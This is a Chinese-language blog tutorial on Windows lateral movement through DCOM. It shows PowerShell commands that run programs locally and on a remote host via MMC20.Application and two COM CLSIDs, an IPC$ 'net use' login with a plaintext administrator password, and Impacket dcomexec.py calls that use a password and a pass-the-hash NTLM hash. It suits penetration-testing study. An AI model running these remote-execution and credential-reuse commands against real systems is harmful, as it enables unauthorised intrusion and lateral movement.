**目录**

[DCOM](#t0 "DCOM")

[本地DCOM执行命令](#t1 "本地DCOM执行命令")

[获取DCOM程序列表](#t2 "获取DCOM程序列表")

[使用DCOM执行任意系统命令](#t3 "使用DCOM执行任意系统命令")

[使用DCOM在远程机器上执行任意系统命令](#t4 "使用DCOM在远程机器上执行任意系统命令")

[1：调用MMC20Application远程执行命令](#t5 "1：调用MMC20Application远程执行命令")

[2：调用9BA05972-F6A8-11CF-A442-00A0C90A8F39远程执行命令](#t6 "2：调用9BA05972-F6A8-11CF-A442-00A0C90A8F39远程执行命令")

[3：调用C08AFD90-F2A1-11D1-8455-00A0C91F3880远程执行命令](#t7 "3：调用C08AFD90-F2A1-11D1-8455-00A0C91F3880远程执行命令")

* * *

DCOM
====

DCOM(分布式组件对象模型)是微软的一系列概念和程序接口。通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。DCOM是基于组件对象模型(COM)的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口。

本地DCOM执行命令
----------

### **获取DCOM程序列表**

PowerShell3.0及以上版本命令(Windows Server 2012及以上版本操作系统)

```
Get-CimInstance Win32_DCOMApplication
```


![](https://img-blog.csdnimg.cn/20200202200422767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

PowerShell2.0命令(Windows7/Server2008等操作系统)

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
```


![](https://img-blog.csdnimg.cn/20200202200756470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **使用DCOM执行任意系统命令**

在本地启动一个**管理员权限**的powershell，执行如下命令，该方法通过ExecuteShellCommand运行了calc.exe程序

```
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))      
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
```


![](https://img-blog.csdnimg.cn/20200202201431465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用DCOM在远程机器上执行任意系统命令
--------------------

以下三种方法均需先IPC$连接

```
net use \\192.168.10.131 /u:administrator "x123456./@"
```


但是实际测试中，以下三种方法都出现了同一个错误

![](https://img-blog.csdnimg.cn/20200202204633744.png)

### **1：调用MMC20Application远程执行命令**

需要使用对方主机管理员组内账号，并且对方主机需要关闭防火墙。

```
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.131"))      
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
```


但是这里执行到第二步出错了。。 

![](https://img-blog.csdnimg.cn/20200202204600913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **2：调用9BA05972-F6A8-11CF-A442-00A0C90A8F39远程执行命令**

适用于Windows7-10，Windows Server2008-Server2016

```
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.10.131")      
$obj = [System.Activator]::CreateInstance($com)      
$item = $obj.item()      
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0
```


但是这里执行到第二步出错了。 

![](https://img-blog.csdnimg.cn/20200202204440542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **3：调用C08AFD90-F2A1-11D1-8455-00A0C91F3880远程执行命令**

该方法不适用于Win7，适用于Win10和Server2012 R2

```
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.10.131")      
$obj = [System.Activator]::CreateInstance($com)      
$obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```


但是这里执行到第二步出错了。。 

![](https://img-blog.csdnimg.cn/20200202204245252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Impacket下的dcomexec.py
---------------------

```
./dcomexec.py  administrator:root@192.168.10.20  whoami      
./dcomexec.py  administrator:@192.168.10.20  whoami  -hashes d480ea9533c500d4aad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[域渗透——利用DCOM在远程系统执行程序](https://www.secshi.com/21666.html "域渗透——利用DCOM在远程系统执行程序")

                  [如何利用DCOM实现横向渗透](https://cloud.tencent.com/developer/article/1171111 "如何利用DCOM实现横向渗透")